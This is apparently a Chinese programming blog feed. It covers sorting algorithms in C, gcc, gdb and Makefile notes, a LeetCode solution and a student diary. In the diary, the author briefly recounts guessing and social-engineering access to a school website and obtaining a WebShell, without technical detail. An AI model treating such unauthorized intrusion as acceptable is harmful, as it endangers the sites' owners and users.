        <span class="token function">swap</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>A<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">PercDown</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<h2 id="4">归并排序</h2>

<h3 id="u4ECB_u7ECD-2"><a href="#u4ECB_u7ECD-2" class="headerlink" title="介绍"></a>介绍</h3><p>归并排序以<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=O({N}\log{N}\" alt="">)最坏情形运行时间运行，而使用的比较次数几乎是最优的。它的基本操作是合并两个已排好序的表。基本的合并算法是取两个输入数组A和B，一个输出数组C，以及三个计数器<em>Aptr</em>,<em>Bptr</em>,<em>Cptr</em>,它们初始置于对应数组的开始端。A[<em>Aptr</em>]和B[<em>Bptr</em>]中的较小者被拷贝到C中的下一个位置，相关的计数器向前推进一步。当两个输入表有一个用完的时候，则将另一个表中的剩余部分拷贝到C中。<br>合并两个已排序的表的时间显然是线性的，因为最多进行了N-1次比较，其中N是元素的总数。</p>
<p>该算法是递归地将前半部分数据和后半部分数据鸽子归并排序，得到排序后的两个部分数据，然后使用上面描述的合并算法再将这两部分合并到一起。这是经典的分治(divide-and-conquer)策略，它将问题分成一些小的问题然后递归求解，而治的阶段则将分的阶段解得的各个答案修补到一起。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">MSort</span><span class="token punctuation">(</span>ElementType A<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>ElementType TmpArray<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> Left<span class="token punctuation">,</span><span class="token keyword">int</span> Right<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> Center<span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>Left <span class="token operator">&lt;</span> Right<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        Center <span class="token operator">=</span> <span class="token punctuation">(</span>Left <span class="token operator">+</span> Right<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token function">MSort</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span> TmpArray<span class="token punctuation">,</span> Left<span class="token punctuation">,</span> Center<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">MSort</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span> TmpArray<span class="token punctuation">,</span> Center <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> Right<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">Merge</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span> TmpArray<span class="token punctuation">,</span> Left<span class="token punctuation">,</span> Center <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> Right<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">Mergesort</span><span class="token punctuation">(</span>ElementType A<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> N<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    ElementType <span class="token operator">*</span>TmpArray<span class="token punctuation">;</span>

    TmpArray <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>N <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ElementType<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>TmpArray <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">MSort</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span> TmpArray<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> N <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">free</span><span class="token punctuation">(</span>TmpArray<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
        <span class="token function">FatalError</span><span class="token punctuation">(</span><span class="token string">"No space for tmp array!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>Merge函数的精妙在于任何时刻只用一个临时数组活动，而且使用该临时数组的任意部分。</p>
<h3 id="u7B97_u6CD5_u5206_u6790-1"><a href="#u7B97_u6CD5_u5206_u6790-1" class="headerlink" title="算法分析"></a>算法分析</h3><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// Lpos = start of left halt,Rpos = start of right half</span>
<span class="token keyword">void</span> <span class="token function">Merge</span><span class="token punctuation">(</span>ElementType A<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>ElementType TmpArray<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> Lpos<span class="token punctuation">,</span><span class="token keyword">int</span> Rpos<span class="token punctuation">,</span><span class="token keyword">int</span> RightEnd<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> i<span class="token punctuation">,</span>LeftEnd<span class="token punctuation">,</span>NumElements<span class="token punctuation">,</span>TmpPos<span class="token punctuation">;</span>

    LeftEnd <span class="token operator">=</span> Rpos <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
    TmpPos <span class="token operator">=</span> Lpos<span class="token punctuation">;</span>
    NumElements <span class="token operator">=</span> RightEnd <span class="token operator">-</span> Lpos <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// main loop</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>Lpos <span class="token operator">&lt;=</span> LeftEnd <span class="token operator">&amp;&amp;</span> Rpos <span class="token operator">&lt;=</span> RightEnd<span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>A<span class="token punctuation">[</span>Lpos<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> A<span class="token punctuation">[</span>Rpos<span class="token punctuation">]</span><span class="token punctuation">)</span>
            TmpArray<span class="token punctuation">[</span>TmpPos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>Lpos<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span>
            TmpArray<span class="token punctuation">[</span>TmpPos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>Rpos<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>Lpos <span class="token operator">&lt;=</span> LeftEnd<span class="token punctuation">)</span>
        TmpArray<span class="token punctuation">[</span>TmpPos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>Lpos<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// Copy rest of first half</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>Rpos <span class="token operator">&lt;=</span> RightEnd<span class="token punctuation">)</span>
        TmpArray<span class="token punctuation">[</span>TmpPos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>Rpos<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// Copy rest of second half</span>

    <span class="token comment" spellcheck="true">// Copy TmpArray back</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NumElements<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">,</span>RightEnd<span class="token operator">--</span><span class="token punctuation">)</span>
        A<span class="token punctuation">[</span>RightEnd<span class="token punctuation">]</span> <span class="token operator">=</span> TmpArray<span class="token punctuation">[</span>RightEnd<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h3 id="u603B_u7ED3-2"><a href="#u603B_u7ED3-2" class="headerlink" title="总结"></a>总结</h3><p>虽然归并排序的运行时间是<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=O({N}\log{N}\" alt="">)，但它很难用于主存排序，主要问题在于合并两个排序的表需要线性附加内存，在整个算法中还要花费将数据拷贝到临时数组再拷贝回来这样一些附加的工作，其结果严重放慢了排序的速度。这种拷贝可以通过在递归交替层次时审慎地转换A和TmpArray的角色得到避免。</p>
<h2 id="5">快速排序</h2>

<h3 id="u4ECB_u7ECD-3"><a href="#u4ECB_u7ECD-3" class="headerlink" title="介绍"></a>介绍</h3><p>快速排序(quicksort)是实践中最快的已知排序算法，它的平均运行时间是<br><img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=O({N}\log{N}\" alt="">)。它的最坏情形的性能为<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=O(N^{2}\" alt="">)。快速排序也是一种分治的递归算法。讲数组S排序的基本算法由下列简单的四步组成:</p>
<ul>
<li>1: 如果S中元素个数是0或1，则返回。</li>
<li>2: 取S中任一元素v，称之为<code>枢纽元(pivot)</code>。</li>
<li>3: 将S - {v}(S中其余元素)分成两个不相交的集合:<img src="http://latex.codecogs.com/gif.latex?S_%7B_%7B1%7D%7D%3D%5C%7Bx%5Cepsilon%20S-%7Bv%7D%7Cx%5Cleqslant%20v%5C%7D" alt="">和<img src="http://latex.codecogs.com/gif.latex?S_%7B_%7B2%7D%7D%3D%5C%7Bx%5Cepsilon%20S-%7Bv%7D%7Cx%5Cgeqslant%20v%5C%7D" alt="">。</li>
<li>4: 返回{quicksort(<img src="http://latex.codecogs.com/gif.latex?S_%7B_%7B1%7D%7D" alt="">)后，继随v,继而quicksort(<img src="http://latex.codecogs.com/gif.latex?S_%7B_%7B2%7D%7D" alt="">)}。</li>
</ul>
<h3 id="u7B97_u6CD5_u5206_u6790-2"><a href="#u7B97_u6CD5_u5206_u6790-2" class="headerlink" title="算法分析"></a>算法分析</h3><h4 id="u9009_u53D6_u67A2_u7EBD_u5143"><a href="#u9009_u53D6_u67A2_u7EBD_u5143" class="headerlink" title="选取枢纽元"></a>选取枢纽元</h4><p>枢纽元的选取对算法性能的影响很大，一种错误的方法是选择第一个元素用作枢纽元，另一种想法是选取前两个互异的关键字中较大者作为枢纽元。一种安全的做法是随机选取枢纽元，然而随机数的生成一般是昂贵的，根本减少不了算法其余部分的平均运行时间。比较常用的是三数中值分割法(Median-of-Three Partitioning)。枢纽元的最好的选择是数组的中值。然而这很难算出。一般的做法是使用左端、右端和中心位置的三个元素的中值作为枢纽元。</p>
<h4 id="u5C0F_u6570_u7EC4"><a href="#u5C0F_u6570_u7EC4" class="headerlink" title="小数组"></a>小数组</h4><p>对于很小的数组(N&lt;=20),快速排序不如插入排序好。通常的解决方法是对于小的数组不递归的使用快速排序，而代之以诸如插入排序这样的对小数组有效的排序算法。一种好的截止范围(cutoff range)是N=10。</p>
<h4 id="u7B97_u6CD5_u6838_u5FC3"><a href="#u7B97_u6CD5_u6838_u5FC3" class="headerlink" title="算法核心"></a>算法核心</h4><p>快速排序真正的核心包括<strong>分割</strong>和<strong>递归调用</strong>。选取枢纽元最容易的方法是对<code>A[Left]</code>、<code>A[Right]</code>、<code>A[Center]</code>适当地排序。将三元素中的最小者放在<code>A[Left]</code>，这正是分割阶段应该将它放到的位置。三元素中的最大者被分在<code>A[Right]</code>，因为它大于枢纽元。因此，我们可以把枢纽元放到<code>A[Right-1]</code>并在分割阶段将<code>i</code>和<code>j</code>初始化到<code>Left+1</code>和<code>Right-2</code>。</p>
<pre class=" language-c"><code class="language-c">ElementType <span class="token function">Median3</span><span class="token punctuation">(</span>ElementType A<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> Left<span class="token punctuation">,</span> <span class="token keyword">int</span> Right<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> Center <span class="token operator">=</span> <span class="token punctuation">(</span>Left <span class="token operator">+</span> Right<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>A<span class="token punctuation">[</span>Left<span class="token punctuation">]</span> <span class="token operator">></span> A<span class="token punctuation">[</span>Center<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token function">Swap</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>A<span class="token punctuation">[</span>Left<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>A<span class="token punctuation">[</span>Center<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>A<span class="token punctuation">[</span>Left<span class="token punctuation">]</span> <span class="token operator">></span> A<span class="token punctuation">[</span>Right<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token function">Swap</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>A<span class="token punctuation">[</span>Left<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>A<span class="token punctuation">[</span>Right<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>A<span class="token punctuation">[</span>Center<span class="token punctuation">]</span> <span class="token operator">></span> A<span class="token punctuation">[</span>Right<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token function">Swap</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>A<span class="token punctuation">[</span>Center<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>A<span class="token punctuation">[</span>Right<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// Invariant:A[Left] &lt;= A[Center] &lt;= A[Right]</span>

    <span class="token function">Swap</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>A<span class="token punctuation">[</span>Center<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>A<span class="token punctuation">[</span>Right <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// Hide pivot</span>
    <span class="token keyword">return</span> A<span class="token punctuation">[</span>Right <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Return pivot</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">Qsort</span><span class="token punctuation">(</span>ElementType A<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> Left<span class="token punctuation">,</span> <span class="token keyword">int</span> Right<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">;</span>
    ElementType Pivot<span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>Left <span class="token operator">+</span> Cutoff <span class="token operator">&lt;=</span> Right<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        Pivot <span class="token operator">=</span> <span class="token function">Median3</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span> Left<span class="token punctuation">,</span> Right<span class="token punctuation">)</span><span class="token punctuation">;</span>
        i <span class="token operator">=</span> Left<span class="token punctuation">;</span> j <span class="token operator">=</span> Right <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span> <span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">while</span><span class="token punctuation">(</span>A<span class="token punctuation">[</span><span class="token operator">++</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> Pivot<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
            <span class="token keyword">while</span><span class="token punctuation">(</span>A<span class="token punctuation">[</span><span class="token operator">--</span>j<span class="token punctuation">]</span> <span class="token operator">></span> Pivot<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> j<span class="token punctuation">)</span>
                <span class="token function">Swap</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>A<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span> 
                <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">Swap</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>A<span class="token punctuation">[</span>Right <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// Restore pivot</span>

        <span class="token function">Qsort</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span> Left<span class="token punctuation">,</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">Qsort</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> Right<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>    <span class="token comment" spellcheck="true">// Do an insertion sort on the subarray</span>
        <span class="token function">InsertionSort</span><span class="token punctuation">(</span>A <span class="token operator">+</span> Left<span class="token punctuation">,</span> Right <span class="token operator">-</span> Left <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>for循环里的两个while循环，实现了从左到右和从右到左寻找第一个不满足条件的元素进行交换。</p>
<h3 id="u603B_u7ED3-3"><a href="#u603B_u7ED3-3" class="headerlink" title="总结"></a>总结</h3><p>在理解堆排序和归并排序后，快速排序的理解就容易对了。和归并排序一样，难点都在于递归的调用。快速排序的细节也需要注意，稍微一个改变都有可能使该算法不能正确运行。</p>
<p>(To be continued)</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[在最好的年华，做自己最想做的事]]></title>
      <url>http://xinqiu.me/2015/05/09/Diary-1/</url>
      <content type="html"><![CDATA[<p>一转眼就到了五月，当初告诉自己大一要做哪些哪些事，却发现如今也就做了那么几件，当初的全栈工程师的理想，现在想想，感觉太遥远、太梦幻。现在的想法就是踏踏实实的学好基础。</p>
<h3 id="u611F_u60F3"><a href="#u611F_u60F3" class="headerlink" title="感想"></a>感想</h3><p>这学期开始想打好基础，之前看了&lt;<c专家编程>&gt;,虽然后半部分偏向底层的东西，看的不是很透，但看一遍经典书后，稍微对C又有了些深入的了解。最近看&lt;&lt;数据结构与算法分析–C语言描述&gt;&gt;,选择慢慢看,原理和源代码都在边看边思考。说实话，很想和其他同学一样Java看看JavaScript看看，什么CSS3、HTML5、NoSQL这些东西都去了解些。要是上学期，可能我也会这么东学西学。虽然自己有广涉猎，但想到我哥的教诲，还是安心学基础，学底层。数据结构看过一遍，可能就要开始专心刷刷ACM题来锻炼思维。Python和C++都还有一半要等着去看。爱玩的心真是无法改变，Docker也去凑热闹玩了玩，Linux服务器也在玩，买了域名也玩过了，和电信的80端也斗争过最后选择了2222端口来抒发无尽的郁闷，虽然不是黑客，结果连蒙带猜社工了学校一个小网站，拿了WebShell(大三学生帮学校用TomCat做的网站，这也让我深深的意识到以后做项目，弱口令这块不可忽视)。</c专家编程></p>
<p>大二开始，就要安心学习，大一太疯癫，被坑参加了一些不必要的活动。大学四年，说到底还是为了将来就业。我不想为了什么去迎合太多人。我可不想大学四年的简历上空空的写上拿到了毕业证，哦对了，或者写上该生所在宿舍年年被评为文明宿舍，该生致力于班级的学风建设月云云。想到了知乎上的问题<a href="http://www.zhihu.com/question/29591270" target="_blank" rel="external">如何看待大学里独自埋头苦读的同学？</a>。我知道很多人不理解为什么我要那么拼命的学习，不理解我为什么用Mac、Kindle。我不是官二代富二代，而我能做的，就是在我有限的青春年华里，多奋斗，才能争取到无限的未来。大学说到底还是看个人。你学，或者不学，没人拦你，但毕业就在那里，不逃得了暂时，逃不了一世。我知道我学校不好，这也是为什么我要更努力，想缩小与C9学校大学生的差距可能难度较大，但我希望至少不被他们拉太距离。</p>
<h3 id="u8BA1_u5212"><a href="#u8BA1_u5212" class="headerlink" title="计划"></a>计划</h3><p>多读书，读好书。</p>
<p>一个月保证两篇及以上有质量的博客。昨天折腾安装TinyOS，忘记做了笔记，有空补。</p>
<p>暑假争取补补MOOC，学学英语。大学里考个托福。</p>
<p>开发一两个iOS应用那才是极好的。</p>
<h3 id="u76EE_u6807"><a href="#u76EE_u6807" class="headerlink" title="目标"></a>目标</h3><p>目标这种东西，即使有点远大，也比没有好。</p>
<p>所以我要向着MSRA努力。</p>
<blockquote>
<p>再长的路，一步步也能走完；再短的路，不迈开双脚也无法到达。–汪国真</p>
</blockquote>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Linux C 程序设计基础学习]]></title>
      <url>http://xinqiu.me/2015/03/27/Linux-C-Coding-Study/</url>
      <content type="html"><![CDATA[<h1 id="Linux_C__u7F16_u7A0B_u5B66_u4E60"><a href="#Linux_C__u7F16_u7A0B_u5B66_u4E60" class="headerlink" title="Linux C 编程学习"></a>Linux C 编程学习</h1><blockquote>
<p>这是我学习Linux C编程的笔记</p>
</blockquote>
<h1 id="u524D_u671F_u51C6_u5907"><a href="#u524D_u671F_u51C6_u5907" class="headerlink" title="前期准备"></a>前期准备</h1><hr>
<h2 id="GCC_u76F8_u5173"><a href="#GCC_u76F8_u5173" class="headerlink" title="GCC相关"></a>GCC相关</h2><h3 id="gcc_u57FA_u672C_u7528_u6CD5"><a href="#gcc_u57FA_u672C_u7528_u6CD5" class="headerlink" title="gcc基本用法"></a>gcc基本用法</h3><pre class=" language-bash"><code class="language-bash">~$ gcc <span class="token punctuation">[</span>options<span class="token punctuation">]</span><span class="token punctuation">[</span>filenames<span class="token punctuation">]</span>
</code></pre>
<h5 id="u5E38_u7528_u7F16_u8BD1_u9009_u9879"><a href="#u5E38_u7528_u7F16_u8BD1_u9009_u9879" class="headerlink" title="常用编译选项"></a>常用编译选项</h5><ul>
<li><p>-o : out_putfilename: 确定可执行文件的名称为output_filename，缺省则位a.out</p>
</li>
<li><p>-c : 只编译，不连接成为可执行文件，生成.o的文件</p>
</li>
<li><p>-g : 产生调试工具(GNU下是gdb)所必要的符号信息，想进行调试，必须加此选项</p>
</li>
<li><p>-O : 对程序进行优化编译、连接</p>
</li>
<li><p>-O2 : 比-O更好的优化编译，连接，编译、连接过程更慢</p>
</li>
<li><p>-Idirname : 将dirname所之处的目录添加到文件头文件目录列表中</p>
</li>
<li><p>-Ldirname : 讲dirname所指出的目录加入到库文件的目录列表中</p>
</li>
<li><p>-lname : 在连接是，装载名为<code>libname.a</code>的函数库</p>
</li>
<li><p>-statoc : 使用静态链接库文件,linux下连接的缺省操作是首先连接动态库</p>
</li>
<li><p>-Wall : 生成所有警告信息</p>
</li>
<li><p>-w : 不生成任何警告信息</p>
</li>
<li><p>-DMACRO : 定义MACRO宏，等效于在程序中使用#define MACRO</p>
</li>
</ul>
<blockquote>
<p>运行是在终端里执行程序前加time可得到运行程序的时间情况</p>
</blockquote>
<h4 id="GDB_u7A0B_u5E8F_u8C03_u8BD5"><a href="#GDB_u7A0B_u5E8F_u8C03_u8BD5" class="headerlink" title="GDB程序调试"></a>GDB程序调试</h4><h5 id="1-_u542F_u52A8GDB"><a href="#1-_u542F_u52A8GDB" class="headerlink" title="1.启动GDB"></a>1.启动GDB</h5><pre class=" language-bash"><code class="language-bash">~$ gdb filename
</code></pre>
<h5 id="2-_u5728main_u51FD_u6570_u5904_u8BBE_u7F6E_u65AD_u70B9"><a href="#2-_u5728main_u51FD_u6570_u5904_u8BBE_u7F6E_u65AD_u70B9" class="headerlink" title="2.在main函数处设置断点"></a>2.在main函数处设置断点</h5><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token keyword">break</span> main
</code></pre>
<h5 id="3-_u8FD0_u884C_u7A0B_u5E8F13"><a href="#3-_u8FD0_u884C_u7A0B_u5E8F13" class="headerlink" title="3.运行程序13"></a>3.运行程序13</h5><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> run
</code></pre>
<h5 id="4-_u5355_u6B65_u8C03_u8BD5"><a href="#4-_u5355_u6B65_u8C03_u8BD5" class="headerlink" title="4.单步调试"></a>4.单步调试</h5><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> next
</code></pre>
<h5 id="5-_u7EE7_u7EED_u8FD0_u884C"><a href="#5-_u7EE7_u7EED_u8FD0_u884C" class="headerlink" title="5.继续运行"></a>5.继续运行</h5><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token keyword">continue</span>
</code></pre>
<h4 id="GDB_u547D_u4EE4"><a href="#GDB_u547D_u4EE4" class="headerlink" title="GDB命令"></a>GDB命令</h4><ul>
<li>list(l) 查看程序</li>
<li>break(b) 函数名 在函数入口添加断点</li>
<li>break(b) 行号 在指定行添加断点</li>
<li>break(b) 文件名:行号 指定文件指定行添加断点</li>
<li>break(b) 行号if条件 当条件为真，指定行号处断点生效</li>
<li>info break 查看所以设置的断点</li>
<li>delete 断点编号 删除断点</li>
<li>run(r) 开始运行程序</li>
<li>next(n) 单步运行程序(不进入子函数)</li>
<li>step(s) 单步运行程序(进入子函数)</li>
<li>continue(c) 继续运行程序</li>
<li>print(p) 变量名 查看变量的值</li>
<li>finish 运行程序，知道当前函数结束</li>
<li>watch 变量名 对指定变量进行监控</li>
<li>quit(q) 退出gdb</li>
</ul>
<h3 id="Makefile__u5DE5_u7A0B_u7BA1_u7406"><a href="#Makefile__u5DE5_u7A0B_u7BA1_u7406" class="headerlink" title="Makefile 工程管理"></a>Makefile 工程管理</h3><p>规则:</p>
<pre class=" language-makefile"><code class="language-makefile"><span class="token symbol">target</span><span class="token punctuation">:</span>prerequisites
    command
</code></pre>
<p>注:命令需要以TAB键开始，第一条一般为最终目标</p>
<p>make命令默认在当前目录下寻找名字为makefile或者Makefile的工程文件，当名字不为这两者之一时，可以使用如下方法指定:</p>
<pre class=" language-bash"><code class="language-bash">~$ <span class="token function">make</span> -f 文件名
</code></pre>
<p>Makefile中把那些没有任何依赖只有执行东子的目标称为”伪目标”(phony targets)</p>
<pre class=" language-makefile"><code class="language-makefile">[例1]
<span class="token builtin">.PHONY</span><span class="token symbol"> </span><span class="token punctuation">:</span> clean
<span class="token symbol">clean </span><span class="token punctuation">:</span>
    rm -f hello main.o func1.o func2.o
<span class="token symbol">注</span><span class="token punctuation">:</span>.PHONY 将 clean 目标声明为伪目标 
[例2]
obj<span class="token operator">=</span>main.o func1.o func2.o func3.o
<span class="token symbol">hello</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>
    gcc <span class="token variable">$</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> -o hello
</code></pre>
<p>默认变量</p>
<ul>
<li>$^: 代表所有的依赖文件</li>
<li>$@: 代表目标</li>
<li>$&lt;: 代表第一个依赖文件</li>
</ul>
<p>其他Tips:</p>
<ul>
<li><p><code>#</code> 后面的内容被视为注释</p>
</li>
<li><p>@: 取消回显</p>
</li>
</ul>
<hr>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[LeetCode - Maximum Depth of Binary Tree]]></title>
      <url>http://xinqiu.me/2015/02/28/LeetCode-104/</url>
      <content type="html"><![CDATA[<h1 id="Maximum_Depth_of_Binary_Tree"><a href="#Maximum_Depth_of_Binary_Tree" class="headerlink" title="Maximum Depth of Binary Tree"></a>Maximum Depth of Binary Tree</h1><blockquote>
<p>Given a binary tree, find its maximum depth.</p>
<p>The maximum depth is the number of nodes along the longest path from the root node down to the farthest leaf node.</p>
</blockquote>
<pre class=" language-c++"><code class="language-c++">
/**
 * Definition for binary tree
 * struct TreeNode {
 *     int val;
 *     TreeNode *left;
 *     TreeNode *right;
 *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}
 * };
 */
class Solution {
public:
    int maxDepth(TreeNode *root) {
        if(root == NULL)
            return 0;
        return max(maxDepth(root->left),maxDepth(root->right))+1;
    }
};
</code></pre>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Play Minecraft on Ubuntu]]></title>
      <url>http://xinqiu.me/2015/02/11/Linux+MC/</url>
